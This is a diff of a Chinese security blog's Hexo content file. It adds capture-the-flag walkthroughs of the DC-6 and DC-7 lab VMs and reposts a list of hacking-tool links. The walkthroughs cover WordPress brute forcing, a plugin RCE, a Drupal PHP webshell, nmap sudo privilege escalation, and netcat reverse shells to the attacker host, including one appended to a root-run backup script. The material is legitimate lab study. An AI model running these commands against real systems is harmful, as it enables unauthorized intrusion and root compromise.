href="https://github.com/brianwrf/hackUtils">https://github.com/brianwrf/hackUtils</a><br>Nikto Web服务器扫描仪：<br><a href="https://github.com/sullo/nikto">https://github.com/sullo/nikto</a><br>自动化的多合一OS命令注入和利用工具：<br><a href="https://github.com/commixproject/commix">https://github.com/commixproject/commix</a><br>sslscan测试：<br><a href="https://github.com/rbsec/sslscan">https://github.com/rbsec/sslscan</a><br>Windows安全工具套件：<br><a href="https://github.com/codejanus/ToolSuite">https://github.com/codejanus/ToolSuite</a><br>Apache实时日志分析器系统：<br><a href="https://github.com/mthbernardes/ARTLAS">https://github.com/mthbernardes/ARTLAS</a><br>检测网络入侵的特征，恶意蜘蛛（Malspider）：<br><a href="https://github.com/ciscocsirt/malspider">https://github.com/ciscocsirt/malspider</a><br>下一代网络扫描仪WhatWeb：<br><a href="https://github.com/urbanadventurer/whatweb">https://github.com/urbanadventurer/whatweb</a><br>WPScan，WordPress漏洞扫描程序：<br><a href="https://github.com/wpscanteam/wpscan">https://github.com/wpscanteam/wpscan</a><br>【sqlmap】:<br><a href="https://github.com/sqlmapproject/sqlmap">https://github.com/sqlmapproject/sqlmap</a><br>SQLi-Hunter(HTTP代理服务器和一个SQLMAP API包装器):<br><a href="https://github.com/zt2/sqli-hunter">https://github.com/zt2/sqli-hunter</a><br>中国菜刀：<br><a href="https://github.com/Chora10/Cknife">https://github.com/Chora10/Cknife</a></p>
-<h1 id="Fuzz"><a href="#Fuzz" class="headerlink" title="Fuzz"></a>Fuzz</h1><p>Web应用程序模糊器：<br><a href="https://github.com/xmendez/wfuzz">https://github.com/xmendez/wfuzz</a></p>
-<h1 id="漏洞及渗透练习平台"><a href="#漏洞及渗透练习平台" class="headerlink" title="漏洞及渗透练习平台"></a>漏洞及渗透练习平台</h1><p>WebGoat漏洞练习平台：<br><a href="https://webgoat.github.io/WebGoat/">https://webgoat.github.io/WebGoat/</a><br>dvwa漏洞练习平台：<br><a href="https://github.com/ethicalhack3r/DVWA">https://github.com/ethicalhack3r/DVWA</a><br>数据库注入练习平台 ：<br><a href="https://github.com/Audi-1/sqli-labs">https://github.com/Audi-1/sqli-labs</a><br>like OWASP Node Goat：<br><a href="https://github.com/cr0hn/vulnerable-node">https://github.com/cr0hn/vulnerable-node</a><br>Ruby编写的一款工具，安全方案生成器（SecGen）：<br><a href="https://github.com/cliffe/secgen">https://github.com/cliffe/secgen</a><br>VulApps漏洞练习平台：<br><a href="https://github.com/Medicean/VulApps">https://github.com/Medicean/VulApps</a><br>ZVuldrill Web突破演练平台：<br><a href="https://github.com/710leo/ZVulDrill">https://github.com/710leo/ZVulDrill</a><br>WebGoat旧版：<br><a href="https://github.com/WebGoat/WebGoat-Legacy">https://github.com/WebGoat/WebGoat-Legacy</a></p>
+    <title>DCchallenges6</title>
+    <url>/posts/e38f4498/</url>
+    <content><![CDATA[<p>TIPS</p>
+<blockquote>
+<p>CLUE<br>OK, this isn’t really a clue as such, but more of some “we don’t want to spend five years waiting for a certain process to finish” kind of advice for those who just want to get on with the job.</p>
+<p>cat /usr/share/wordlists/rockyou.txt | grep k01 &gt; passwords.txt That should save you a few years. ;-)</p>
+</blockquote>
+<br/>
+
+<p>环境</p>
+<blockquote>
+<p>网段    192.168.18.0/24</p>
+<p>kali    192.168.18.131</p>
+<p>靶机 </p>
+</blockquote>
+<br/>
+
+<p>扫描网段</p>
+<blockquote>
+<p><strong>kali@kali2020:~$ sudo nmap 192.168.18.0/24 -sn</strong></p>
+<p>Starting Nmap 7.91 ( <a href="https://nmap.org/">https://nmap.org</a> ) at 2021-05-06 19:40 CST<br>Nmap scan report for 192.168.18.2<br>Host is up (0.00027s latency).<br>MAC Address: 00:50:56:E0:DA:9A (VMware)<br>Nmap scan report for 192.168.18.137<br>Host is up (0.00047s latency).<br>MAC Address: 00:0C:29:74:F8:D0 (VMware)<br>Nmap scan report for 192.168.18.254<br>Host is up (0.00029s latency).<br>MAC Address: 00:50:56:E1:37:77 (VMware)<br>Nmap scan report for 192.168.18.131<br>Host is up.<br>Nmap done: 256 IP addresses (4 hosts up) scanned in 1.97 seconds</p>
+</blockquote>
+<p>扫描靶机开放的端口</p>
+<blockquote>
+<p><strong>kali@kali2020:~$ sudo nmap 192.168.18.137 -p- -sV</strong></p>
+<p>Starting Nmap 7.91 ( <a href="https://nmap.org/">https://nmap.org</a> ) at 2021-05-06 19:41 CST<br>Nmap scan report for 192.168.18.137<br>Host is up (0.0017s latency).<br>Not shown: 65533 closed ports<br>PORT   STATE SERVICE VERSION<br><strong>22/tcp open  ssh     OpenSSH 7.4p1 Debian 10+deb9u6 (protocol 2.0)</strong></p>
+<p><strong>80/tcp open  http    Apache httpd 2.4.25 ((Debian))</strong></p>
+<p>MAC Address: 00:0C:29:74:F8:D0 (VMware)<br>Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel</p>
+<p>Service detection performed. Please report any incorrect results at <a href="https://nmap.org/submit/">https://nmap.org/submit/</a> .<br>Nmap done: 1 IP address (1 host up) scanned in 12.12 seconds</p>
+</blockquote>
+<p>开放了22端口和80端口</p>
+<p>dirsearch扫一下目录</p>
+<blockquote>
+<p>… ..</p>
+<p>[19:44:43] 301 -  321B  - /wp-content  -&gt;  <a href="http://192.168.18.137/wp-content/">http://192.168.18.137/wp-content/</a><br>[19:44:43] 301 -  319B  - /wp-admin  -&gt;  <a href="http://192.168.18.137/wp-admin/">http://192.168.18.137/wp-admin/</a></p>
+<p>[19:44:43] 301 -  322B  - /wp-includes  -&gt;  <a href="http://192.168.18.137/wp-includes/">http://192.168.18.137/wp-includes/</a></p>
+<p>[19:44:43] 200 -   42KB - /wp-includes/<br>[19:44:43] 500 -    0B  - /wp-content/plugins/hello.php<br>[19:44:43] 200 -    0B  - /wp-config.php    </p>
+<p>[19:44:44] 302 -    0B  - /wp-admin/  -&gt;  <a href="http://wordy/wp-login.php?redirect_to=http://192.168.18.137/wp-admin/&amp;reauth=1">http://wordy/wp-login.php?redirect_to=http%3A%2F%2F192.168.18.137%2Fwp-admin%2F&amp;reauth=1</a></p>
+<p>[19:44:44] 302 -    0B  - /wp-signup.php  -&gt;  <a href="http://wordy/wp-login.php?action=register">http://wordy/wp-login.php?action=register</a></p>
+<p>… …</p>
+</blockquote>
+<br/>
+
+<p>浏览器登录<code>192.168.18.137</code>发现会跳转到<code>http://wordy</code>，那需要修改一下host</p>
+<blockquote>
+<p>sudo vim /etc/hosts</p>
+<p>192.168.18.137 wordy</p>
+</blockquote>
+<p>进入主页可以看出这是<code>WordPress</code>,第二关也是WordPress</p>
+<p>进入后台<code>wordy/wp-login.php</code> </p>
+<p>使用wpscan扫一下</p>
+<blockquote>
+<p>kali@kali2020:~$ wpscan –url wordy -e u</p>
+<p>[i] User(s) Identified:</p>
+<p>[+] admin<br> | Found By: Rss Generator (Passive Detection)<br> | Confirmed By:<br> |  Wp Json Api (Aggressive Detection)<br> |   - <a href="http://wordy/index.php/wp-json/wp/v2/users/?per_page=100&amp;page=1">http://wordy/index.php/wp-json/wp/v2/users/?per_page=100&amp;page=1</a><br> |  Author Id Brute Forcing - Author Pattern (Aggressive Detection)<br> |  Login Error Messages (Aggressive Detection)</p>
+<p>[+] sarah<br> | Found By: Author Id Brute Forcing - Author Pattern (Aggressive Detection)<br> | Confirmed By: Login Error Messages (Aggressive Detection)</p>
+<p>[+] graham<br> | Found By: Author Id Brute Forcing - Author Pattern (Aggressive Detection)<br> | Confirmed By: Login Error Messages (Aggressive Detection)</p>
+<p>[+] mark<br> | Found By: Author Id Brute Forcing - Author Pattern (Aggressive Detection)<br> | Confirmed By: Login Error Messages (Aggressive Detection)</p>
+<p>[+] jens<br> | Found By: Author Id Brute Forcing - Author Pattern (Aggressive Detection)<br> | Confirmed By: Login Error Messages (Aggressive Detection)</p>
+</blockquote>
+<p>一共扫出5个用户<code>admin,sarah,graham,mark,jens</code></p>
+<p>根据官网上的线索，需要用到kali自带的<code>rockyou.txt</code></p>
+<p>但是使用命令时说不存在，去看了下需要解压</p>
+<p><code>gzip -d /usr/share/wordlists/rockyou.txt.gz</code></p>
+<p><code>cat /usr/share/wordlists/rockyou.txt | grep k01 &gt; passwords.txt</code></p>
+<blockquote>
+<p>kali@kali2020:<del>/Tools/DCchallenges/DCchallenges6$ cat /usr/share/wordlists/rockyou.txt | grep k01 &gt; passwords_DC6.txt<br>kali@kali2020:</del>/Tools/DCchallenges/DCchallenges6$ ls<br>passwords_DC6.txt  username.txt</p>
+</blockquote>
+<p>wpscan爆破一下</p>
+<blockquote>
+<p>kali@kali2020:~/Tools/DCchallenges/DCchallenges6$ wpscan –url wordy -U username.txt -P passwords_DC6.txt </p>
+<p>[!] Valid Combinations Found:<br> | Username: mark, Password: helpdesk01</p>
+</blockquote>
+<p>得到<code>mark    helpdesk01</code></p>
+<p>看看这个账号能不能进入后台    ，成功进入后台</p>
+<p>进入后台一直没找到切入点，看了下网上的，从Activity monitor插件为突破口</p>
+<p>去漏洞库看看有啥漏洞可以利用</p>
+<blockquote>
+<p>kali@kali2020:~/Tools/DCchallenges/DCchallenges6$ searchsploit Activity monitor</p>
+<hr>
+<p> Exploit Title                       |  Path</p>
+<hr>
+<p>Activity Monitor 2002 2.6 - Remote D | windows/dos/22690.c<br>RedHat Linux 6.0/6.1/6.2 - ‘pam_cons | linux/local/19900.c<br>WordPress Plugin Plainview Activity  | php/webapps/45274.html</p>
+<hr>
+<p>Shellcodes: No Results</p>
+</blockquote>
+<br/>
+
+<blockquote>
+<p>kali@kali2020:~/Tools/DCchallenges/DCchallenges6$ sudo cp /usr/share/exploitdb/exploits/php/webapps/45274.html 45274.html</p>
+</blockquote>
+<p>可以看到这是个Activity monitor插件的RCE,执行点在<code>TOOLS</code>下的<code>IP or interger</code></p>
+<p>提前监听kali的端口<code>nc -nlvp 8888</code></p>
+<p>使用burp抓包</p>
+<p><img src="nc1.png"><br><img src="nc2.png"></p>
+<br/>
+
+<p><code>python -c &#39;import pty;pty.spawn(&quot;/bin/bash&quot;)&#39;</code></p>
+<p>返回/home 看到有四个用户，</p>
+<blockquote>
+<p><strong>cd mark</strong></p>
+<p><strong>cd stuff</strong></p>
+<p><strong>cat things-to-do.txt</strong></p>
+<p>cat things-to-do.txt<br>Things to do:</p>
+<ul>
+<li>Restore full functionality for the hyperdrive (need to speak to Jens)</li>
+<li>Buy present for Sarah’s farewell party</li>
+<li>Add new user: graham - GSo7isUM1D4 - done</li>
+<li>Apply for the OSCP course</li>
+<li>Buy new laptop for Sarah’s replacement</li>
+</ul>
+</blockquote>
+<p>发现一个账户 <code>graham - GSo7isUM1D4</code></p>
+<blockquote>
+<p>www-data@dc-6:/home/mark/stuff$ su graham<br>su graham<br>Password: GSo7isUM1D4</p>
+<p>graham@dc-6:/home/mark/stuff$</p>
+</blockquote>
+<p>提权</p>
+<p>也可以尝试使用ssh登录</p>
+<p><code>kali@kali2020:~$ ssh graham@192.168.18.137</code></p>
+<blockquote>
+<p>graham@dc-6:~$ sudo -l<br>Matching Defaults entries for graham on dc-6:<br>    env_reset, mail_badpass,<br>    secure_path=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin</p>
+<p>User graham may run the following commands on dc-6:<br>    (jens) NOPASSWD: /home/jens/backups.sh</p>
+</blockquote>
+<p><code>home/jens</code>下可以不需要密码执行</p>
+<blockquote>
+<p>graham@dc-6:~$ cd ../<br>graham@dc-6:/home$ ls<br>graham  jens  mark  sarah<br>graham@dc-6:/home$ </p>
+</blockquote>
+<p>向<code>bacjuos.sh</code>写入 <code>/bin/bash</code></p>
+<blockquote>
+<p>graham@dc-6:/home/jens$ echo /bin/bash &gt;&gt; backups.sh<br>graham@dc-6:/home/jens$ sudo -u jens ./backups.sh<br>tar: Removing leading `/‘ from member names<br>/home/jens/backups.sh: line 3: “/bin/bash”: No such file or directory<br>jens@dc-6:~$ </p>
+</blockquote>
+<p>成功切换到jens用户</p>
+<p><code>sudo -l</code> 获取jens权限</p>
+<blockquote>
+<p>jens@dc-6:~$ sudo -l<br>Matching Defaults entries for jens on dc-6:<br>    env_reset, mail_badpass,<br>    secure_path=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin</p>
+<p>User jens may run the following commands on dc-6:<br>    (root) NOPASSWD: /usr/bin/nmap</p>
+</blockquote>
+<p>发现可以免密使用nmap</p>
+<p>nmap提权参考<code>https://gtfobins.github.io/gtfobins/nmap/</code></p>
+<p>nmap查看版本</p>
+<blockquote>
+<p>jens@dc-6:~$ nmap -V</p>
+<p>Nmap version 7.40 ( <a href="https://nmap.org/">https://nmap.org</a> )<br>Platform: x86_64-pc-linux-gnu<br>Compiled with: liblua-5.3.3 openssl-1.1.0c libpcre-8.39 libpcap-1.8.1 nmap-libdnet-1.12 ipv6<br>Compiled without:<br>Available nsock engines: epoll poll select</p>
+</blockquote>
+<br/>
+
+<blockquote>
+<p>TF=$(mktemp)<br>echo ‘os.execute(“/bin/sh”)’ &gt; $TF<br>sudo nmap –script=$TF</p>
+</blockquote>
+<p>执行了一下，结果靶机崩了，重置一下</p>
+<p>靶机ip改成了192.168.18.139</p>
+<p>ssh连接  <code>graham - GSo7isUM1D4</code></p>
+<p><code>kali@kali2020:~$ ssh graham@192.168.18.139</code></p>
+<blockquote>
+<p>raham@dc-6:/home/jens$ sudo -u jens ./backups.sh<br>tar: Removing leading `/‘ from member names<br>/home/jens/backups.sh: line 3: “/bin/bash”: No such file or directory<br>jens@dc-6:~$ </p>
+</blockquote>
+<blockquote>
+<p>TF=$(mktemp)<br>echo ‘os.execute(“/bin/sh”)’ &gt; $TF<br>sudo nmap –script=$TF</p>
+</blockquote>
+<p>成功上升为root权限,进入/root得到flag<br><img src="flag.png"></p>
+<br/>
+
+<br/>
+
+<p>总结</p>
+<ul>
+<li><p>wpscan爆破</p>
+</li>
+<li><p>Activity monitor RCE</p>
+</li>
+<li><p>nc反弹shell</p>
+</li>
+<li><p>ssh连接</p>
+</li>
+<li><p>nmap提权</p>
+</li>
+</ul>
+<br/>
+
+<br/>
+
+
+<p>Reference</p>
+<blockquote>
+<p><a href="https://gtfobins.github.io/gtfobins/nmap">https://gtfobins.github.io/gtfobins/nmap</a></p>
+</blockquote>
 ]]></content>
       <categories>
-        <category>工具手册</category>
+        <category>DCchallenges</category>
       </categories>
       <tags>
-        <tag>工具手册</tag>
+        <tag>DCchallenges</tag>
+      </tags>
+  </entry>
+  <entry>
+    <title>DCchallenges7</title>
+    <url>/posts/9488740e/</url>
+    <content><![CDATA[<h3 id="信息收集"><a href="#信息收集" class="headerlink" title="信息收集"></a>信息收集</h3><h4 id="环境"><a href="#环境" class="headerlink" title="环境"></a>环境</h4><blockquote>
+<p>网段        192.168.18.0/24</p>
+<p>kali        192.168.18.131</p>
+<p>靶机        192.168.18.140</p>
+</blockquote>
+<h4 id="扫描网段"><a href="#扫描网段" class="headerlink" title="扫描网段"></a>扫描网段</h4><blockquote>
+<p> kali@kali2020:~$ sudo nmap 192.168.18.0/24 -p- -sV<br>Starting Nmap 7.91 ( <a href="https://nmap.org/">https://nmap.org</a> ) at 2021-05-07 14:16 CST<br>Nmap scan report for 192.168.18.2<br>Host is up (0.00045s latency).<br>Not shown: 65534 closed ports<br>PORT   STATE SERVICE VERSION<br>53/tcp open  domain  dnsmasq 2.78<br>MAC Address: 00:50:56:E0:DA:9A (VMware)</p>
+<p>Nmap scan report for 192.168.18.140<br>Host is up (0.00055s latency).<br>Not shown: 65533 closed ports<br>PORT   STATE SERVICE VERSION<br>22/tcp open  ssh     OpenSSH 7.4p1 Debian 10+deb9u6 (protocol 2.0)<br>80/tcp open  http    Apache httpd 2.4.25 ((Debian))<br>MAC Address: 00:0C:29:7C:A6:2A (VMware)<br>Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel</p>
+<p>Nmap scan report for 192.168.18.254<br>Host is up (0.00025s latency).<br>All 65535 scanned ports on 192.168.18.254 are filtered<br>MAC Address: 00:50:56:E1:37:77 (VMware)</p>
+<p>Nmap scan report for 192.168.18.131<br>Host is up (0.0000030s latency).<br>All 65535 scanned ports on 192.168.18.131 are closed</p>
+<p>Service detection performed. Please report any incorrect results at <a href="https://nmap.org/submit/">https://nmap.org/submit/</a> .<br>Nmap done: 256 IP addresses (4 hosts up) scanned in 64.63 seconds</p>
+</blockquote>
+<h4 id="扫描靶机"><a href="#扫描靶机" class="headerlink" title="扫描靶机"></a>扫描靶机</h4><blockquote>
+<p> kali@kali2020:~$ sudo nmap 192.168.18.140 -p- -sV<br>Starting Nmap 7.91 ( <a href="https://nmap.org/">https://nmap.org</a> ) at 2021-05-07 21:11 CST<br>Nmap scan report for 192.168.18.140<br>Host is up (0.0017s latency).<br>Not shown: 65533 closed ports<br>PORT   STATE SERVICE VERSION<br>22/tcp open  ssh     OpenSSH 7.4p1 Debian 10+deb9u6 (protocol 2.0)<br>80/tcp open  http    Apache httpd 2.4.25 ((Debian))<br>MAC Address: 00:0C:29:7C:A6:2A (VMware)<br>Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel</p>
+<p>Service detection performed. Please report any incorrect results at <a href="https://nmap.org/submit/">https://nmap.org/submit/</a> .<br>Nmap done: 1 IP address (1 host up) scanned in 8.94 seconds</p>
+</blockquote>
+<h4 id="dirsearch扫目录"><a href="#dirsearch扫目录" class="headerlink" title="dirsearch扫目录"></a>dirsearch扫目录</h4><blockquote>
+<p> <a href="http://192.168.18.140/user/login">http://192.168.18.140/user/login</a></p>
+</blockquote>
+<br/>
+
+<p>进入主页看到时使用的<code>Drupa</code>，之前的dc-1也是使用的这个</p>
+<h4 id="根据提示找线索"><a href="#根据提示找线索" class="headerlink" title="根据提示找线索"></a>根据提示找线索</h4><blockquote>
+<p>Welcome to DC-7</p>
+<p>DC-7 introduces some “new” concepts, but I’ll leave you to figure out what they are.  :-)</p>
+<p>While this challenge isn’t all that technical, if you need to resort to brute forcing or a dictionary attacks, you probably won’t succeed.</p>
+<p>What you will have to do, is to think “outside” the box.</p>
+<p>Way “outside” the box.  :-)</p>
+</blockquote>
+<blockquote>
+<p>dc-7引入了一些“新”概念，但我还是让你们自己来弄清楚它们是什么。—-)<br>虽然这个挑战并不完全是技术性的，但如果你需要诉诸粗暴的强迫或字典攻击，你可能不会成功。<br>你要做的是，想“外面”的盒子。<br>“外面”的盒子。—-)</p>
+</blockquote>
+<p>一直没搞懂这个外盒啥意思，看了下别人的博客，原来在主页下左下角有个<code>@DC7USER</code>，twitter上提示</p>
+<p>了github地址，<code>https://github.com/Dc7User</code>,里面有一个<code>staffdb</code>,首先看下<code>config.php</code></p>
+<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">	<span class="variable">$servername</span> = <span class="string">&quot;localhost&quot;</span>;</span><br><span class="line">	<span class="variable">$username</span> = <span class="string">&quot;dc7user&quot;</span>;</span><br><span class="line">	<span class="variable">$password</span> = <span class="string">&quot;MdR3xOgB7#dW&quot;</span>;</span><br><span class="line">	<span class="variable">$dbname</span> = <span class="string">&quot;Staff&quot;</span>;</span><br><span class="line">	<span class="variable">$conn</span> = mysqli_connect(<span class="variable">$servername</span>, <span class="variable">$username</span>, <span class="variable">$password</span>, <span class="variable">$dbname</span>);</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
+<h3 id="ssh登录"><a href="#ssh登录" class="headerlink" title="ssh登录"></a>ssh登录</h3><p>可以得到一个数据库的账号密码，试了下无法登录网站</p>
+<p>看看这个账号密码能不能登录ssh</p>
+<p><code>dc7user</code> <code>MdR3xOgB7#dW</code>，成功登录</p>
+<blockquote>
+<p><strong>dc7user@dc-7:~$ sudo -l</strong><br>-bash: sudo: command not found</p>
+<p>** dc-7:~$ sudo **</p>
+<p>-bash: sudo: command not found<br>You have new mail in /var/mail/dc7user<br>** dc7user@dc-7:~$ cat /var/mail/dc7user ** .</p>
+<p>内容和下面mbox差不多</p>
+</blockquote>
+<br/>
+
+<blockquote>
+<p>** dc7user@dc-7:<del>$ ls **<br>backups  mbox<br>** dc7user@dc-7:</del>$ cat mbox **</p>
+<p>发现了3个备份文件</p>
+<p>数据库文件</p>
+<p>/home/dc7user/backups/website.sql</p>
+<p>shell脚本文件 </p>
+<p>/opt/scripts/backups.sh</p>
+<p>网站备份文件</p>
+<p>/home/dc7user/backups/website.tar.gz</p>
+</blockquote>
+<br/>
+
+<blockquote>
+<p>** dc7user@dc-7:~$ cat /opt/scripts/backups.sh  **</p>
+<p>#!/bin/bash<br>rm /home/dc7user/backups/*<br>cd /var/www/html/<br>drush sql-dump –result-file=/home/dc7user/backups/website.sql<br>cd ..<br>tar -czf /home/dc7user/backups/website.tar.gz html/<br>gpg –pinentry-mode loopback –passphrase PickYourOwnPassword –symmetric /home/dc7user/backups/website.sql<br>gpg –pinentry-mode loopback –passphrase PickYourOwnPassword –symmetric /home/dc7user/backups/website.tar.gz<br>chown dc7user:dc7user /home/dc7user/backups/*<br>rm /home/dc7user/backups/website.sql<br>rm /home/dc7user/backups/website.tar.gz<br>dc7user@dc-7:~ $<br>** dc7user@dc-7:~$ ls -l /opt/scripts/backups.sh **</p>
+<p>-rwxrwxr-x 1 root www-data 520 Aug 29  2019 /opt/scripts/backups.sh</p>
+</blockquote>
+<p>bash脚本中有用到<code>drush</code>和<code>gpg</code>命令，查查用法</p>
+<p>可以使用<code>gpg</code>和<code>drush</code>命令</p>
+<h3 id="使用drush修改管理员密码"><a href="#使用drush修改管理员密码" class="headerlink" title="使用drush修改管理员密码"></a>使用drush修改管理员密码</h3><p>drush可以修改用户密码</p>
+<blockquote>
+<p>Drush是Drupal的命令行shell和Unix脚本接口。Drush Core附带了许多有用的命令，可用于与模块/主题/配置文件等代码进行交互。</p>
+</blockquote>
+<p><code>drush user-password admin --password=&quot;123&quot;</code></p>
+<blockquote>
+<p>dc7user@dc-7:~ $ drush user-password admin –password=”123”<br>Command user-password needs a higher bootstrap level to run - you will need to invoke drush from a more functional Drupal environment to run this command.                                                                      [error]<br>The drush command ‘user-password admin’ could not be executed.                                                                                                                                                                  [error]<br>dc7user@dc-7:~$ </p>
+</blockquote>
+<p>执行失败，进入/var/www/html目录试试</p>
+<blockquote>
+<p>dc7user@dc-7:/var/www/html$ drush user-password admin –password=”123”<br>Changed password for admin                                                                                                                                                                                                      [success]<br>dc7user@dc-7:/var/www/html$ </p>
+</blockquote>
+<p>修改密码成功，试试能不能登录网站<code>http://192.168.18.140/user/login</code></p>
+<p><code>admin</code>,<code>123</code>成功登录</p>
+<h3 id="反弹shell"><a href="#反弹shell" class="headerlink" title="反弹shell"></a>反弹shell</h3><p>想办法反弹shell，看看能不能上传一句话木马连接</p>
+<p>新建文件发现类型没有php</p>
+<p><img src="nophp.png"></p>
+<p>看看<code>Extend</code>插件扩展能不能安装php,没找到，需要手动安装，看了下别人的wp</p>
+<p>下载php filter模块</p>
+<blockquote>
+<p><a href="https://www.drupal.org/project/php">https://www.drupal.org/project/php</a></p>
+</blockquote>
+<p><img src="phpinstallerror.png"></p>
+<p>提示安装格式应该为<code>zip tar tgz gz bz2</code></p>
+<p>下载tar.gz 保存到本地然后上传</p>
+<p><img src="phpinstall1.png"></p>
+<p><img src="phpinstall2.png"></p>
+<p><img src="phpinstall3.png"></p>
+<p><img src="phpinstall4.png"></p>
+<p>安装成功</p>
+<p>写个phpinfo()试试能不能成功</p>
+<p><img src="phpinfo1.png"></p>
+<p><img src="phpinfo2.png"></p>
+<h4 id="写一句话"><a href="#写一句话" class="headerlink" title="写一句话"></a>写一句话</h4><p><img src="yijuhua.png"></p>
+<h4 id="连接蚁剑"><a href="#连接蚁剑" class="headerlink" title="连接蚁剑"></a>连接蚁剑</h4><p><img src="yijuhua_yijian.png"></p>
+<br/>
+
+<h4 id="nc反弹shell"><a href="#nc反弹shell" class="headerlink" title="nc反弹shell"></a>nc反弹shell</h4><blockquote>
+<p>kali <code>nc -nlvp 8888</code></p>
+<p>蚁剑 <code>nc -c /bin/sh 192.168.18.131 8888</code></p>
+</blockquote>
+<p><img src="shell.png"></p>
+<p>反弹交互shell</p>
+<p><code>python -c &#39;import pty;pty.spawn(&quot;/bin/bash&quot;)&#39;</code></p>
+<h3 id="提权"><a href="#提权" class="headerlink" title="提权"></a>提权</h3><p>将反弹shell的脚本写入到<code>/opt/scripts/backups.sh</code></p>
+<p><code>echo &quot;nc -e /bin/bash 192.168.18.131 7777&quot; &gt;&gt; /opt/scripts/backups.sh</code></p>
+<p>成功反弹到root的shell ，不过需要多等一会才行</p>
+<p><img src="rootshell.png"></p>
+<p><img src="flag.png"></p>
+<blockquote>
+<p>注:其实可以在写一句话的时候可以直接写反弹shell<br><code>&lt;?php system(&#39;nc -e /bin/sh 192.168.18.131 9999&#39;); ?&gt;</code><br><img src="ncshell.png"></p>
+</blockquote>
+]]></content>
+      <categories>
+        <category>DCchallenges</category>
+      </categories>
+      <tags>
+        <tag>DCchallenges</tag>
       </tags>
   </entry>
   <entry>
@@ -653,15 +837,21 @@
       </tags>
   </entry>
   <entry>
-    <title>hexo文章插入图片</title>
-    <url>/posts/7ecd88c4/</url>
-    <content><![CDATA[<h3 id="本地引用-采用相对路径"><a href="#本地引用-采用相对路径" class="headerlink" title="本地引用(采用相对路径)"></a>本地引用(采用相对路径)</h3><p>在 <code>config.yml</code>文件中配置，post_asset_folder设为true，当再次新建文章时，会在source/_post中生产和文章同名的文件夹，把需要的图片资源放入该文件夹，就可以使用相对路径来引用图片.</p>
-<figure class="highlight html"><table><tr><td class="code"><pre><span class="line">_posts/post_name/image.jpg</span><br><span class="line"></span><br><span class="line">![](image.jpg)</span><br><span class="line">![](image.png)</span><br></pre></td></tr></table></figure>]]></content>
+    <title>Hacker_Tools-转</title>
+    <url>/posts/ec585c99/</url>
+    <content><![CDATA[<h1 id="Hacker-Tools"><a href="#Hacker-Tools" class="headerlink" title="Hacker_Tools"></a>Hacker_Tools</h1><p>来源：<a href="https://github.com/deliciousYSH/Hacker_Tools">https://github.com/deliciousYSH/Hacker_Tools</a></p>
+<h1 id="扫描器"><a href="#扫描器" class="headerlink" title="扫描器"></a>扫描器</h1><p>Nmap端口扫描器：<br><a href="https://github.com/nmap/nmap">https://github.com/nmap/nmap</a><br>被动式注入检测工具： <a href="https://github.com/sea-god/GourdScan">https://github.com/sea-god/GourdScan</a><br>高质量扫描Linux / FreeBSD Server中的任何漏洞：<br><a href="https://github.com/future-architect/vuls">https://github.com/future-architect/vuls</a><br>子域名扫描器：<br>Altdns-通过变更和排列发现子域：<a href="https://github.com/infosec-au/altdns">https://github.com/infosec-au/altdns</a><br>SubBrute使用开放式解析器作为一种代理来规避DNS速率限制：<a href="https://github.com/TheRook/subbrute">https://github.com/TheRook/subbrute</a><br>subDomainsBrute 1.2一个针对渗透测试者的快速子域暴力工具：<a href="https://github.com/lijiejie/subDomainsBrute">https://github.com/lijiejie/subDomainsBrute</a><br>Sublist3r:<a href="https://github.com/aboul3la/Sublist3r">https://github.com/aboul3la/Sublist3r</a><br>本地网络扫描器（打开网页时扫描本地网络的PoC Javascript）：<br><a href="https://github.com/SkyLined/LocalNetworkScanner">https://github.com/SkyLined/LocalNetworkScanner</a><br>HellRaiser基于端口扫描以及关联CVE:<br><a href="https://github.com/m0nad/HellRaiser">https://github.com/m0nad/HellRaiser</a><br>Routeh-页面上的漏洞路由器：<br><a href="https://github.com/jh00nbr/Routeh">https://github.com/jh00nbr/Routeh</a><br>防火墙检测工具：<br><a href="https://github.com/EnableSecurity/wafw00f">https://github.com/EnableSecurity/wafw00f</a><br>漏洞扫描程序，以最少的规则集在短时间内扫描大量目标：<br><a href="https://github.com/lijiejie/BBScan">https://github.com/lijiejie/BBScan</a><br>基于SQLMAP的主动和被动SQL注入的漏洞扫描工具： <a href="https://github.com/fengxuangit/Fox-scan/">https://github.com/fengxuangit/Fox-scan/</a></p>
+<h1 id="信息搜集工具"><a href="#信息搜集工具" class="headerlink" title="信息搜集工具"></a>信息搜集工具</h1><p>社工收集工具：<br><a href="https://github.com/n0tr00t/Sreg">https://github.com/n0tr00t/Sreg</a><br>信息扫描工具：<br><a href="https://github.com/darryllane/Bluto">https://github.com/darryllane/Bluto</a><br>本地网络扫描仪：<br><a href="https://github.com/sowish/LNScan">https://github.com/sowish/LNScan</a><br>通过RDP扫描可访问性工具后门：<br><a href="https://github.com/linuz/Sticky-Keys-Slayer">https://github.com/linuz/Sticky-Keys-Slayer</a><br>网络基础设施渗透测试工具：<br><a href="https://github.com/SECFORCE/sparta">https://github.com/SECFORCE/sparta</a><br>GitHub信息收集：<br><a href="https://github.com/metac0rtex/GitHarvester">https://github.com/metac0rtex/GitHarvester</a></p>
+<h1 id="密码破解"><a href="#密码破解" class="headerlink" title="密码破解"></a>密码破解</h1><p>密码破解工具（开膛手Johnny）:<br><a href="https://github.com/shinnok/johnny">https://github.com/shinnok/johnny</a><br>获取存储在本地计算机上大量的密码：<br><a href="https://github.com/AlessandroZ/LaZagne">https://github.com/AlessandroZ/LaZagne</a><br>SNMP暴力破解：<br><a href="https://github.com/SECFORCE/SNMP-Brute">https://github.com/SECFORCE/SNMP-Brute</a></p>
